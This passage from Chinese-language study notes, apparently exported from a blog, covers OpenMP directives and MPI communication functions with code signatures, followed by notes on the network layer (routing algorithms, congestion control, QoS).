工作共享结构将所包含的代码划分给线程组的成员来执行\n- 进入工作共享结构没有barrier，但在出口隐含barrier\n\t- 并行do/for loop：线程组并行执行代码，实现数据并行\n\t- 并行sections：计算任务分成单独的、不连续的部分，每个线程执行一部分，可以实现函数并行\n\t- single：串行执行代码\n#### for指令\nfor指令指定循环语句必须由线程组并行执行，**假设已经启动了并行区域，否则将串行执行**\n```c\n#pragma omp for [[clause[[,]clause]…] \n\tfor-loops\nclause:\n\tschedule(kind[,chunk_size])\n\tordered[(n)]\n\tprivate(list)\n\tfirstprivate(list)\n\tlastprivate(list)\n\treduction(reduction-identifier : list)\n\tcollapse(n)\n\tnowait\n```\n##### schedule子句\n- **schedule(kind[,chunk_size])**：描述循环迭代如何划分给多个线程\n- kind可以为static（静态）、dynamic（动态）、guided（引导）、runtime（运行时）、auto（自动）五种模式\n- **static**：循环迭代被划分成小块，静态的分配给线程。\n\t- chunk_size为块大小，如果没有指定则迭代均匀连续划分给线程\n- **dynamic**：循环迭代被划分成小块，在线程间动态调度。\n\t- 当线程完成一块时，动态分配另一块，块大小默认为1\n- **guided**：当线程请求任务时，迭代块被动态分配给线程，直到所有迭代块被分配完为止。与dynamic类似，只是每次分配的迭代块的大小会减少。\n\t- 初始块大小与num_iterations/num_threads成正比\n\t- 后续分配的块大小与num_iterations_remain/num_threads成正比\n\t- chunk_size定义最小块大小，默认为1\n- **runtime**：运行时根据环境变量omp_schedule在确定调度类型，最终使用的是上述三种之一。\n- **auto**：由编译器或者运行时系统决定调度类型\n##### ordered子句和nowait子句\n- **ordered[(n)]**：指定区域的循环迭代将按串行顺序执行，与单个处理器处理结果顺序一致\n\t- ordered子句只能用在for或parallel for中\n- **nowait**：忽略并行区域隐含barrier的同步等待，\n##### collapse子句\n- **collapse(n)**：指定嵌套循环中的n个循环折叠到一个大的迭代空间中，并根据调度子句划分并行执行\n\t- 所有相关循环的顺序执行决定了折叠迭代空间中迭代的顺序\n\t- 能够解决线程间负载均衡或线程负载太小的问题\n##### 使用限制\n- 不能是while循环，或者任何循环迭代次数不确定的循环\n- 循环迭代变量（i）必须是整数，并且对于所有线程，循环 控制参数（i++）必须相同\n- 程序的正确性不能依赖于某个线程执行的特定迭代\n- 跳转或跳出循环是非法的\n- 块大小必须为整数次迭代\n- schedule、ordered和collapse子句只可以出现一次\n\n#### sections指令\n- sections指令指定所包含的代码段被分配给各个线程执行\n- 不同section部分可以由不同线程执行，如果一个线程运行的块，也可以执行多个部分\n```c\n#pragma omp sections [clause[ [, ] clause] ...]\n{\n\t#pragma omp section\n\t\tstructured-block\n\t#pragma omp section\n\t\tstructured-block\n\t...\n}\nclause:\n\tprivate(list)\n\tfirstprivate(list)\n\tlastprivate(list)\n\treduction(reduction-identifier: list)\n\tnowait\n```\n##### 使用限制\n- sections指令的末尾有隐含的barrier，可以使用nowait子句忽略\n- 不能跳转或跳出section代码块\n- section指令必须在封闭的sections指令的词法范围内\n#### single指令\nsingle指令指定所包含的代码仅由一个线程执行，通常用于处理非线程安全的代码段，例如I/O\n```text\n#pragma omp single [clause[ [, ]clause] ...]\n\tstructured-block\nclause:\n\tprivate(list)\n\tfirstprivate(list)\n\tcopyprivate(list)\n\tnowait\n```\n##### 使用限制\n不能跳转或跳出一个single代码块\n\n#### 合并结构(Combined Constructs)\n- 合并了并行区域结构与共享任务结构的指令\n- parallel for指令：合并parallel和for两个指令\n\t- 除了nowait子句外，所有parallel和for适用的子句和规范也都适用于parallel for指令\n- parallel sections指令：合并parallel和sections两个指令\n\t- 除了nowait子句外，所有parallel和for适用的子句和规范也都适用于parallel for指令\n### 同步结构\n实现多线程间互斥访问和同步的指令\n- **master指令**：指定一个代码区域由主线程执行，其他线程跳过这个区域\n- **critical指令**：指定一个代码区域每次只能由一个线程执行（互斥访问），可以实现临界区访问\n- **barrier指令**：指定线程组所有的线程在此指令处同步\n- **atomic指令**：指定以原子方式访问特定的存储位置，该指令仅适用于其后的单个语句，可以实现一个最小临界区的访问\n- **flush指令**：标识一个数据同步点，将线程的变量写回内存，实现内存数据更新\n- **ordered指令**：指定循环迭代以串行执行顺序执行\n#### master指令\n- master指令没有隐含barrier\n- 跳转或跳出master代码块是非法的\n#### critical指令\n```c\n#pragma omp critical [(name)]\n\tstructured-block\n```\n- 如果一条线程正在一个critical区域执行而另一个线程到达这个区域，并企图执行，那么它将会被阻塞，直到第一个线程离开这个区域\n- name是可选项，使不同的cirtical区域共存，具有相同命名的不同的critical区域被当作同一个区域，所有未命名critical区域被当作同一个区域\n#### atomic指令\n```c\n#pragma omp atomic [atomic-clause]\n\texpression-stmt\natomic-clause: read, write, update, or capture\n```\n#### flush指令\n- 明确的表明程序点处需要进行内存更新\n- 指令隐含flush指令，不过如果由nowait子句，则flush指令失效：\n\t- barrier指令；\n\t- parallel指令——进入和退出\n\t- critical指令——进入和退出\n\t- ordered指令——进入和退出\n\t- for指令——退出\n\t- sections指令——退出\n\t- single指令——退出\n#### ordered指令\n- 指定循环迭代以串行执行顺序执行，如果前面的迭代没有完成，则执行后面迭代的线程需要等待\n- ordered指令只能出现在出现在for或者parallel for的动态范围内\n#### 其他指令\n- **threadprivate指令**：指定全局变量被所有线程各自产生一个私有的副本，对于不同并行区域之间的同一个线程，该副本变量是共享的\n### 运行时库函数\n函数|功能\n-|-\n`void omp_set_num_threads(int num_threads)`|设置下一个并行区域使用的线程数量\n`int omp_get_num_threads(void)`|返回当前并行区域线程组中的线程数量\n`int omp_get_max_threads(void)`|返回可通过调用omp_get_num_threads函数返回的最大值\n`int omp_get_thread_num(void)`|返回在线程组中执行此处代码的线程号\n`int omp_get_num_procs(void)`|返回程序可用的处理器数量\n`void omp_set_dynamic(int dynamic_threads)`|启动或禁用线程数的动态线程调整\n`int omp_get_dynamic(void)`|用于确定是否启动动态线程调整\n`void omp_set_schedule(omp_sched_t kind, int chunk_size)`|在指令中将“runtime”作为调度类型时，设置循环调度类型\n`void omp_get_schedule(omp_sched_t *kind, int *chunk_size)`|在指令中将“runtime”作为调度类型时，返回循环调度类型\n`void omp_init_lock(omp_lock_t *lock)`|初始化锁\n`void omp_destroy_lock(omp_lock_t *lock)`|结束锁变量与锁的绑定\n`void omp_set_lock(omp_lock_t *lock)`|获得锁的所有权\n`void omp_unset_lock(omp_lock_t *lock)`|释放锁\n`double omp_get_wtime(void)`|返回一个程序点的时间值(s)\n`double omp_get_wtick(void)`|返回一个程序点的时钟周期的时长(s)\n## MPI\n- 使用消息传递的实现称为消息传递接口（Message-Passing Interface，MPI）\n- MPI是一个消息传递接口标准，而不是编程语言\n- MPI标准定义了一组具有可移植性的编程接口\n- MPI以语言独立的形式存在，可运行在不同的操作系统和硬件平台上\n- 共有上百个函数调用接口，C/C++和Fortran语言中可以直接对这些函数进行调用\n### MPI基本函数\n- MPI初始化：通过`MPI_Init`函数进入MPI环境并完成所有的初始化工作\n```c\nint MPI_Init( int *argc, char ***argv )\n```\n- MPI结束：通过`MPI_Finalize`函数从MPI环境中退出\n```c\nint MPI_Finalize(void)\n```\n- 获取进程的编号：调用`MPI_Comm_rank`函数获得当前进程在指定通信域中的编号，将自身与其他程序区分\n```c\nint MPI_Comm_rank(MPI_Comm comm, int *rank)\n```\n- 获取指定通信域的进程数：调用`MPI_Comm_size`函数获取指定通信域的进程个数，确定自身完成任务比例\n```c\nint MPI_Comm_size(MPI_Comm comm, int *size)\n```\n- 消息发送：`MPI_Send`函数用于发送一个消息到目标进程\n```c\nint MPI_Send(void *buf, int count, MPI_Datatype dataytpe, int dest, int tag, MPI_Comm comm) \n```\n- 消息接收：`MPI_Recv`函数用于从指定进程接收一个消息\n```c\nint MPI_Recv(void *buf, int count, MPI_Datatype datatyepe,int source, int tag, MPI_Comm comm, MPI_Status *status)\n```\n### MPI消息\n- 消息的内容即信的内容，在MPI中称为消息缓冲(Message Buffer)\n- 消息缓冲由三元组<起始地址，数据个数，数据类型>标识\n- 消息的接收/发送者即信的地址，在MPI中称为消息信封(Message Envelop)\n- 消息信封由三元组<源/目标进程，消息标签，通信域>标识 \n#### 数据类型\n- MPI的消息类型分为两种：**预定义类型**和**派生数据类型(Derived Data Type)**\n- **预定义数据类型**：MPI支持异构计算(Heterogeneous Computing)\n\t- 异构计算指在不同计算机系统上运行程序，每台计算可能有不同生产厂商，不同操作系统。\n\t- MPI通过提供预定义数据类型来解决异构计算中的互操作性问题，建立它与具体语言的对应关系\n- **派生数据类型**：MPI引入派生数据类型来定义由数据类型不同且地址空间不连续的数据项组成的消息 \n\n##### MPI_PACKED\n```c\ndouble A[100];\nMPI_Pack_size (50,MPI_DOUBLE,comm,&BufferSize);\nTempBuffer = malloc(BufferSize);\nj = sizeof(MPI_DOUBLE);\nPosition = 0;\nfor (i=0;i<50;i++)\n\tMPI_Pack(A+i*j,1,MPI_DOUBLE,TempBuffer,BufferSize,&Position,comm);\nMPI_Send(TempBuffer,Position,MPI_PACKED,destination,tag,comm); \n```\n- `MPI_Pack_size`函数来决定用于存放50个`MPI_DOUBLE`数据项的临时缓冲区的大小 \n- 调用`malloc`函数为这个临时缓冲区分配内存 \n- for循环中将数组A的50个偶序数元素打包成一个消息并存放在临时缓冲区\n- 将临时缓冲区的数据类型为`MPI_PACKED`的消息发送\n\n消息打包，然后发送\n```c\nMPI_Pack(buf, count, dtype, \n\t\t\t//以上为待打包消息描述\n\t\t\tpackbuf, packsize, packpos, \n\t\t\t//以上为打包缓冲区描述\n\t\t\tcommunicator)\n```\n消息接收，然后拆包\n```c\nMPI_Unpack(packbuf, packsize, packpos,\n\t\t\t//以上为拆包缓冲区描述\n\t\t\tbuf, count, dtype,\n\t\t\t// 以上为拆包消息描述\n\t\t\tcommunicatior)\n```\n##### 派生数据类型\n- **派生数据类型**可以用**类型图**来描述，这是一种通用的类型描述方法，它是一系列二元组<基类型，偏移>的集合，可以表示成如下格式：\n\t- {<基类型0,偏移0>，···，<基类型n-1,偏移n-1>}\n- 在派生数据类型中，基类型可以是任何MPI预定义数据类型，也可以是其它的派生数据类型，即支持数据类型的嵌套定义 \n\n- MPI提供了全面而强大的构造函数(Constructor Function)来定义派生数据类型\n\n函数名|含义\n-|-\n`MPI_Type_contiguous`|定义由相同数据类型的元素组成的类型\n`MPI_Type_vector`|定义由成块的元素组成的类型，块之间具有相同间隔\n`MPI_Type_indexed`|定义由成块的元素组成的类型，块长度和偏移由参数指定\n`MPI_Type_struct`|定义由不同数据类型的元素组成的类型\n`MPI_Type_commit`|提交一个派生数据类型\n`MPI_Type_free`|释放一个派生数据类型\n##### MPI_Type_vector\n- `MPI_Type_vector(count, blocklength, stride, oldtype, &newtype)`\n\t- count：派生数据类型newtype由count个数据块构成。\n\t- blocklength和oldtype：每个数据块由blocklength个oldtype类型的连续数据项组成。\n\t- stride：两个连续数据块的起始位置之间的oldtype类型元素的个数。因此，两个块之间的间隔可以由(stride-blocklength)来表示\n##### MPI_Type_struct\n```c\nMPI_Type_struct(\n    count, //成员数 \n    array_of_blocklengths, //成员块长度数组\n    array_of_displacements,//成员偏移数组     \n    array_of_types, //成员类型数组\n    newtype // 新类型\n) \n```\n#### 通信域\nMPI提供丰富的函数用于管理通信域 \n\n\n函数名|含义\n-|-\n`MPI_Comm_size`|获取指定通信域中进程的个数\n`MPI_Comm_rank`|获取当前进程在指定通信域中的编号\n`MPI_Comm_compare`|对给定的两个通信域进行比较\n`MPI_Comm_dup`|复制一个已有的通信域生成一个新的通信域，两者除通信上下文不同外，其它都一样\n`MPI_Comm_create`|根据给定的进程组创建一个新的通信域\n`MPI_Comm_split`|从一个指定通信域分裂出多个子通信域，每个子通信域中的进程都是原通信域中的进程\n`MPI_Comm_free`|释放一个通信域\n#### 组间通信域\n- **组间通信域**是一种特殊的通信域，该通信域包括了两个进程组，分属于两个进程组的进程之间通过组间通信域实现通信\n- 一般把调用进程所在的进程组称为本地进程组，而把另外一个称为远程进程组\n\n函数名|含义\n-|-\n`MPI_Comm_test_inter`|判断给定的通信域是否为组间通信域\n`MPI_Comm_remote_size`|获取指定组间通信域中远程进程组的大小\n`MPI_Comm_remote_group`|返回给定组间通信域的远程进程组\n`MPI_Intercomm_creat`|根据给定的两个组内通信域生成一个组间通信域。\n`MPI_Intercomm_merge`|将给定组间通信域包含的两个进程组合并，形成一个新的组内通信域\n\n### 点对点通信\n- 共有下面四种通信模式：\n\t- 同步(synchronous)通信模式\n\t- 缓冲(buffered)通信模式\n\t- 标准(standard)通信模式\n\t- 就绪(ready)通信模式\n- 同时也提供了阻塞和非阻塞两种通信机制\n- 不同通信模式和不同通信机制的结合，便产生了非常丰富的点对点通信函数\n#### 同步(synchronous)通信模式\n- 同步通信模式：只有相应的接收过程已经启动，发送过程才正确返回\n- 同步发送返回后，表示发送缓冲区中的数据已经全部被系统缓冲区缓存，并且已经开始发送\n- 同步发送返回后，发送缓冲区可以被释放或者重新使用\n#### 缓冲(buffered)通信模式\n- 缓冲通信模式：缓冲通信模式的发送不管接收操作是否已经启动都可以执行\n- 但是需要用户程序事先申请一块足够大的缓冲区，通过MPI_Buffer_attach实现，通过MPI_Buffer_detach来回收申请的缓冲区\n#### 标准(standard)通信模式\n- 标准通信模式：是否对发送的数据进行缓冲由MPI的实现来决定，而不是由用户程序来控制\n- 发送可以是同步的或缓冲的，取决于实现\n#### 就绪(ready)通信模式\n- 就绪通信模式：发送操作只有在接收进程相应的接收操作已经开始才进行发送\n- 当发送操作启动而相应的接收还没有启动，发送操作将出错。就绪通信模式的特殊之处就是接收操作必须先于发送操作启动\n#### 通信机制\n- 阻塞和非阻塞通信的主要区别在于返回后的资源可用性\n- 阻塞通信返回的条件：\n\t- 通信操作已经完成，即消息已经发送或接收。\n\t- 调用的缓冲区可用。若是发送操作，则该缓冲区可以被其它的操作更新；若是接收操作，该缓冲区的数据已经完整，可以被正确引用\n- 非阻塞通信返回后并不意味着通信操作的完成，MPI还提供了对非阻塞通信完成的检测，主要的有两种MPI_Wait函数和MPI_Test函数\n- MPI的发送操作支持四种通信模式，它们与阻塞属性一起产生了MPI中的8种发送操作\n- MPI的接收操作只有两种：阻塞接收和非阻塞接收\n\nMPI 原语|阻塞|非阻塞\n-|-|-\nStandard Send|`MPI_Send`|`MPI_Isend`\nSynchronous Send|`MPI_Ssend`|`MPI_ Issend`\nBuffered Send|`MPI_ Bsend`|`MPI_ Ibsend`\nReady Send|`MPI_ Rsend`|`MPI_ Irsend`\nReceive|`MPI_Recv`|`MPI_Irecv`\nCompletion Check|`MPI_Wait`|`MPI_Test`\n\n##### Send-Recv函数\n- 给一个进程发送消息，从另一个进程接收消息；\n- 特别适用于在进程链（环）中进行“移位”操作，而避免在通讯为阻塞方式时出现死锁\n```c\nMPI_Sendrecv( sendbuf, sendcount, sendtype, dest, sendtag,\n\t\t\t//以上为消息发送的描述\n\t\t\trecvbuf, recvcount, recvtype, source, recvtag, \n\t\t\t// 以上为消息接收的描述\n\t\t\tcomm, status)\n```\n\n### 集合通信\n- 集合通信一般实现三个功能：通信、聚集和同步\n\t- 通信功能主要完成组内数据的传输 \n\t- 聚集功能在通信的基础上对给定的数据完成一定的操作 \n\t- 同步功能实现组内所有进程在执行进度上取得一致 \n- 按照通信方向的不同，又可以分为三种：\n\t- 一对多通信：一个进程向其它所有的进程发送消息，这个负责发送消息的进程叫做Root进程\n\t- 多对一通信：一个进程从其它所有的进程接收消息，这个接收的进程也叫做Root进程\n\t- 多对多通信：每个进程都向其它所有的进程发送或者接收消息\n\n函数名|含义\n-|-\n`MPI_Bcast`|一对多广播同样的消息\n`MPI_Gather`|多对一收集各个进程的消息\n`MPI_Gatherv`|MPI_Gather的一般化\n`MPI_Allgather`|全局收集\n`MPI_Allgatherv`|MPI_Allgather的一般化\n`MPI_Scatter`|一对多散播不同的消息\n`MPI_Scatterv`|MPI_Scatter的一般化\n`MPI_Alltoall`|多对多全局交换消息\n`MPI_Alltoallv`|MPI_Alltoall的一般化\n`MPI_Reduce`|多对一归约\n`MPI_Allreduce`|MPI_Reduce的一般化\n`MPI_Reduce`|scatter\tMPI_Reduce的一般化\n`MPI_Scan`|扫描\n`MPI_Barrier`|路障同步\n#### 广播MPI_Bcast\n- Root进程发送相同的消息给通信域Comm中的所有进程\n- 对Root进程来说，这个三元组既定义了发送缓冲也定义了接收缓冲。对其它进程来说，这个三元组只定义了接收缓冲 \n```c\nMPI_Bcast(Address, Count, Datatype, Root, Comm)\n```\n\n#### 收集MPI_Gather\n- Root进程从进程域Comm的所有进程(包括它自已)接收消息\n- 消息按照进程的标识rank排序并进行拼接，然后存放在Root进程的接收缓冲中\n- 所有非Root进程忽略接收缓冲\n```c\nMPI_Gather(SendAddress, SendCount, SendDatatype, RecvAddress, RecvCount, RecvDatatype, Root, Comm)\n```\n\n#### 散播MPI_Scatter\n- Scatter执行与Gather相反的操作\n- Root进程给所有进程(包括它自已)发送不同的消息，这n (n为进程域comm包括的进程个数)个消息在Root进程的发送缓冲区中按进程标识的顺序有序地存放\n```c\nMPI_Scatter(SendAddress, SendCount, SendDatatype, RecvAddress, RecvCount, RecvDatatype, Root, Comm)\n```\n\n#### 全局收集MPI_Allgather\n- Allgather操作相当于每个进程都作为Root进程执行了一次Gather调用，即每一个进程都按照Gather的方式收集来自所有进程(包括自己)的数据\n```c\nMPI_Allgather(SendAddress, SendCount, SendDatatype, RecvAddress, RecvCount, RecvDatatype, Comm)\n```\n\n#### 全局交换MPI_Alltoall\n- 每个进程发送一个消息给所有进程(包括它自已)\n- n (n为进程域comm包括的进程个数)个消息在发送缓冲中以进程标识的顺序有序地存放。从接收角度看，每个进程都从所有进程接收一个消息，这n个消息以标号的顺序被连接起来，存放在接收缓冲中\n- 全局交换等价于每个进程作为Root进程执行了一次散播操作\n```c\nMPI_Alltoall(SendAddress, SendCount, SendDatatype, RecvAddress, RecvCount, RecvDatatype, Comm)\n```\n\n#### 路障MPI_Barrier\n- 在路障同步操作MPI_Barrier(Comm)中，通信域Comm中的所有进程相互同步\n```c\nMPI_Barrier(Comm)\n```\n\n#### 归约MPI_Reduce\n- 归约操作对每个进程的发送缓冲区(SendAddress)中的数据按给定的操作进行运算，并将最终结果存放在Root进程的接收缓冲区(RecvAddress)中\n- 参与计算操作的数据项的数据类型在Datatype中定义，归约操作由Op定义\n- 归约操作可以是MPI预定义的,也可以是用户自定义的\n- 归约操作允许每个进程提供向量值，而不只是标量值，向量的长度由Count定义\n```c\nMPI_Reduce(SendAddress, RecvAddress, Count, Datatype, Op, Root, Comm)\n```\n\n操作|含义|操作|含义\n-|-|-|-\n`MPI_MAX`|最大值|`MPI_LOR`|逻辑或\n`MPI_MIN`|最小值|`MPI_BOR`|按位或\n`MPI_SUM`|求和|`MPI_LXOR`|逻辑异或\n`MPI_PROD`|求积|`MPI_BXOR`|按位异或\n`MPI_LAND`|逻辑与|`MPI_MAXLOC`|最大值且相应位置\n`MPI_BAND`|按位与|`MPI_MINLOC`|最小值且相应位置\n\n#### 扫描MPI_scan\n- 可以把扫描操作看作是一种特殊的归约，即每一个进程都对排在它前面的进程进行归约操作\n- MPI_SCAN调用的结果是：对于每一个进程i，它对进程0,1,…,i的发送缓冲区的数据进行了指定的归约操作\n- 扫描操作也允许每个进程贡献向量值，而不只是标量值。向量的长度由Count定义\n```c\nMPI_scan(SendAddress, RecvAddress, Count, Datatype, Op, Comm)\n```","tags":["并行"],"categories":["计软杂谈","学习笔记"]},{"title":"计算机网络-网络层 学习笔记","url":"/reimu-lighthouse/20230128/network-layer/","content":"- 负责通过多个链路从源端向接收方传递数据包\n\n## 网络层的设计问题\n\n### 存储转发数据包交换\n\n- 主机向网络发送数据，数据包由路由器转发\n- 数据包到达路由器，并路由器的链路层完成了对其校验和的验证后，它先被**存储**在路由器上，然后被转发到下一个路由器上\n\n### 提供给传输层的服务\n\n#### 面向无连接的服务（数据报网络）\n\n- 每个数据包都是独立处理的\n- 网络层只负责将数据包从源传送到目的地\n- 数据包使用其目标地址通过路由表进行转发\n    - 数据包可以通过**不同的路径**到达目的地\n- 路由表会由于流量拥塞而进行更新\n    - 管理路由表并做出路由选择的算法称为**路由算法（routing algorithm）**\n\n#### 面向连接的服务（虚电路网络）\n\n- 在发送数据报之前，应建立虚拟连接以确定数据报的传送路径\n- 数据包包含源地址和目标地址，一个流标签，一个虚电路标识符指明属于哪一条虚电路（VC号）\n- 数据包使用其内部的标识符沿虚电路转发\n    - 虚电路建立过程中确定每条链路的VC号，同时在路由器转发表中增加表项\n    - 连接建立后，数据报全部沿**相同的路径**到达目的地\n- 每台路由器的转发表包括了VC号的转换【入接口，入VC号，出接口，出VC号】\n- 路由器会为出境流量分配不同的VC号，这被称为**标签交换（label switching）**\n    - 多协议标签交换（MPLS，MultiiProtocol Label Switching），主要被用在ISP网络\n- 一个分组沿着其路由在每条链路上不简单的保持相同的VC号的原因\n    - 逐链路VC号代替统一号码减少了在分组首部中VC字段的长度\n    - 通过允许沿着该虚电路路径的每条链路有不同的VC号，大大简化了虚电路的建立\n\n#### 虚电路与数据报网络的比较\n\n| 问题  | 数据包网络 | 虚电路网络 |\n|-|-|-|\n| 电路建立 | 不需要 | 需要  |\n| 寻址  | 每个包包含全部的源和目标地址 | 每个包包含简短的VC号 |\n| 状态信息 | 路由器不保留连接状态 | 针对每个连接，每条VC都需要路由器保存其状态 |\n| 路由方式 | 每个数据包被单独路由 | 建立VC时选择路由，所有包都遵循该路由 |\n| 路由器失效的影响 | 没影响，除了那些路由器奔溃期间丢失的包 | 穿过故障路由器的所有VC都将中断 |\n| 服务质量 | 困难  | 容易，如果在预先建立每条VC时有足够的资源可分配 |\n| 拥塞控制 | 困难  | 容易，如果在预先建立每条VC时有足够的资源可分配 |\n\n## 路由算法\n\n### 路由器中的两个进程\n\n#### **路由（routing）**\n\n- 发现网络路径\n- 决定使用哪条路线\n- 生成并更新路由表\n- 依赖于分布式算法\n\n#### **转发（forwarding）**\n\n- 沿路径发送数据包\n- 在每个数据包到达到达的时候对它进行处理，在路由表中查找该数据包所对应的处境线路\n\n### 路由算法\n\n- 将网络建模为节点和链接图\n- 了解网络拓扑\n- 管理路由表\n- 做出路由决策\n- 决定优化什么（例如：公平与效率）\n- 因拓扑的更改而更新路由（例如：发生故障）\n\n### 优化原则\n\n- 最优路径的每个部分也是最优路径\n- 从所有的源到一个指定目标的最优路径的集合构成了一颗以目标节点为根的树，即**汇集树（sink tree）**\n    - 在示例中，“最优”表示跳数最少\n- 所有路由算法的目标是为所有的路由器找到这样的汇集树，并根据汇集树来转发数据包\n\n### 最短路径算法\n\n- **Dijkstra算法**在图上计算一个汇集树\n    - 每条路径都被分配了一个非负的权重/距离\n    - 最短路径是总权重最小的路径\n\n### 泛洪算法（flooding）\n\n- 一种向所有网络节点发送数据包的简单方法，是一种有效的广播手段\n- 路由器将每一个入境数据包发送到除了该数据包到达的那条线路以外的每一条出境线路\n- 可以使用跳计数器来一直泛洪\n- 更好的技术是让路由器需跟踪已经泛洪过的数据包，避免第二次发送它们以阻止泛洪\n- 有非常好的鲁棒性\n\n### 距离矢量算法（distance vector routing）\n\n- 距离矢量是一种分布式路由算法\n    - 最短路径计算在节点之间分割\n    - 又被称为Bellman-ford（Ford-Fulkerson）算法\n    - 是最初ARPANET使用的路由算法\n    - 使用于RIP协议、IGRP协议…\n- 算法：**“tell neighbors where I can go, and how far”**\n    - 通常是以延迟作为距离度量\n    - 每个节点都知道到其邻居的距离\n    - 每个节点定期向所有邻居播发最小已知距离的向量\n    - 每个节点使用接收到的向量更新自己的向量\n- 无穷计算问题\n    - 失败（路由器停机或链路断裂）会导致DV在寻找无法到达的节点的路径时“计数到无穷大”\n\n### 链接状态路由（link state routing）\n\n- 链接状态路由是距离矢量算法的替代（由于无穷计算问题）\n    - 更多的计算但更简单的动态\n    - 广泛应用于互联网（OSPF、IS-IS）\n- 算法： **“tell all which neighbors I have”**\n    - 每个节点在 LSP（链路状态包）中泛洪有关其邻居的信息\n    - 所有节点学习完整的网络图\n    - 每个节点运行 Dijkstra 算法来计算每个目的地的路径\n- LSPs\n    - 节点的 LSP（链路状态包）包含发送方的标识符、序号（Seq）、年龄（Age）、邻居列表和到达它们的链路权重\n    - 链路权重可以选择成本与链路带宽成反比，也可以选择链路的延迟\n    - 可以选择周期性的创建数据包，也可以选择发生重要事件时才创建数据包\n- 可靠泛洪\n    - 序号和年龄用于可靠泛洪\n    - 序号\n        - 序号随着每一个新数据包发出而逐一递增\n        - 新的数据包会被转发到除了入境线路之外的所有其他线路上\n        - 重复数据包会被丢弃\n        - 数据包的序号小于当前看到过的来自该源路由器的最大序列号，则该数据包已过时，被丢弃\n    - 年龄\n        - 年龄每秒钟减1\n        - 当年龄被减到0时，该信息被丢弃\n\n### 层次路由（hierarchical routing）\n\n- 层次路由减少了路由计算的工作量，但可能会导致比平面路由稍长的路径\n\n### 广播路由（broadcast routing）\n\n- 广播向所有节点发送数据包\n    - 多目标路由（multidestination routing）\n    - 逆向路径转发（reverse path forwarding，RPF）\n        - 判断数据包到来的线路是否是通常用来给广播源发送分组的线路。 如果是，路由器将该分组转发到除到来的那条线路之外的所有其他线路\n        - 否则，此分组被当作一个可能的重复分组被丢弃\n        - 通常汇集树被用作来判断是否是最佳线路\n\n### 组播路由（multicast routing）\n\n- 给组发送消息被称为组播\n- 不同的组播有不同的生成树\n- 距离矢量组播路由协议（DVMRP）\n- 基于核心树（core-based trees，CBT）\n    - 使用单棵生成树进行组播\n    - 生成树是从核心（core）节点到组成员的汇集树\n    - 发送者把数据包发送给核心，当数据包到达核心后，它再被沿着树往下转发\n    - 在把数据包发送给核心的过程中，数据包同时沿着树转发到其他分支，即组播并非从核心开始\n\n### 选播路由（anycast routing）\n\n- 向一个最近的组成员发送数据包被称为选播\n- 距离矢量和链路状态路由算法可以用来生成选播路由\n\n### 移动主机路由\n\n- 可以通过家乡代理（home agent）访问移动主机\n\n## 拥塞控制算法\n\n### 网络性能\n\n- 网络的性能可以用延迟、吞吐量和丢包来衡量\n    - 延迟：传输延迟、传播延迟、处理延迟和排队延迟。\n    - 网络中任一点的吞吐量：每秒通过该点的比特数，即该点的数据传输速率\n    - 丢包：传输过程中丢失的数据包数\n- 拥塞控制是一种提高网络性能的机制\n\n### 拥塞控制的途径\n\n- 增加资源或减少负载\n- 不同时间尺度上拥塞控制的途径（从慢到快）\n    - 网络供给（增加资源）\n    - 流量感知路由\n    - 准入控制\n    - 流量调节\n    - 负载脱落\n\n### 流量感知路由（traffic-aware routing）\n\n- 根据流量的变化选择路由，而不仅仅是拓扑结构的变化\n- 最直接的方式是将链路权重设置为一个链路带宽、传输延迟、测量负载或平均排队延迟的函数\n- 但要注意避免振荡（忽略负载，只考虑带宽和传输延迟）\n\n### 准入控制（admission control）\n\n- 除非网络可以携带额外的流量而不会变得拥塞，否则不再建立新的虚电路\n- 可以和流量感知路由相结合\n\n### 流量调节（traffic throttling）\n\n- 拥塞的路由器（内部排队延迟）向发送方发送反馈信息以降低流量\n- 显式拥塞通知（ECN）\n    - 标记数据包，接收方在发送应答包时告知发送方\n- 逐跳后压\n    - 让抑制包在沿途的每一跳都发挥作用\n    - 拥塞点上的拥塞现象能很快得到缓解\n    - 代价是上游路径需要消耗更大的缓冲空间\n\n### 负载丢弃（load shedding）\n\n- 当路由器来不及处理数据包，直接将它们丢弃\n\n## 服务质量（QoS）\n\n### 应用需求\n\n- 带宽、延迟、抖动和丢失绝对了一个流要求的服务质量\n\n| 应用  | 带宽  | 延迟  | 抖动  | 丢失  |\n| --- | --- | --- | --- | --- |\n| 电子邮件 | 低   | 低   | 低   | 中等  |\n| 文件共享 | 高   | 低   | 低   | 中等  |\n| 浏览网页 | 中等  | 中等  | 低   | 中等  |\n| 远程登录 | 低   | 中等  | 中等  | 中等  |\n| 音频点播 | 低   | 低   | 高   | 低   |\n| 视频点播 | 高   | 低   | 高   | 低   |\n| 电话  | 低   | 高   | 高   | 低   |\n| 视频电话 | 高   | 高   | 高   | 低   |\n\n- 网络可以支持不同类别的QoS\n- ATM网络支持：\n\n| 网络类型 | 应用  |\n| --- | --- |\n| 恒定比特率 | 电话  |\n| 实时可变比特率 | 压缩的视频会议 |\n| 非实时可变比特率 | 点播电影 |\n| 可用比特率 | 文件传输 |\n\n### 流量整形（traffic shaping）\n\n- 指调节进入网络的数据流的平均速率和突发性所采用的技术\n- 当一个流在建立时，用户和网络就该流的流量模式达成一致的协议\n\n#### 漏桶/令牌桶\n\n- 漏桶/令牌桶限制了平均速率（R）和短期突发流量（B）\n- 对于漏桶，无论流入漏桶的水的速率有多大，只要，漏桶中还有水，水流出桶的速率是一个恒定速率R\n- 对于令牌桶，水龙头速率为R，水桶容量为B。为了发送一个数据包，必须能从桶中掏出水或令牌\n\n### 包调度（packet scheduling）\n\n- 在同一个流的数据包之间以及在竞争流之间分配路由器资源的算法称为包调度算法\n- 潜在资源\n    - 带宽\n    - 缓冲区\n    - CPU周期\n- 先进先出算法（FIFO）在队列满时通常丢弃新到的数据包（尾丢包），可能造成饥饿\n- 公平队列算法（fair queueing），线路空闲时循环扫描各个流的队列，从下一个队列中取出第一个数据包发送\n- 加权公平队列（WFQ），数据包接数据包改为字节接字节的循环方式，为流设置权重W\n- Fi = max(Ai , Fi-1) +Li/W（每个流单独计算）\n\n### 准入控制（admission control）\n\n- 准入控制采用流规范，并决定网络是否能够承载该规范\n\n### 综合服务（integrated services）\n\n- 为每个流设计QoS；处理组播通信\n- RSVP（资源预留协议）：\n    - 接收方将请求发送回发送方\n    - 沿途的每个路由器都保留资源\n    - 路由器为同一个流合并多个请求\n    - 已设置整个路径，或未进行预留\n\n### 区分服务（differentiated services）\n\n- 加速转发，将服务类型分为常规的和加速的\n- 确保转发，将服务类型分为12种\n\n## 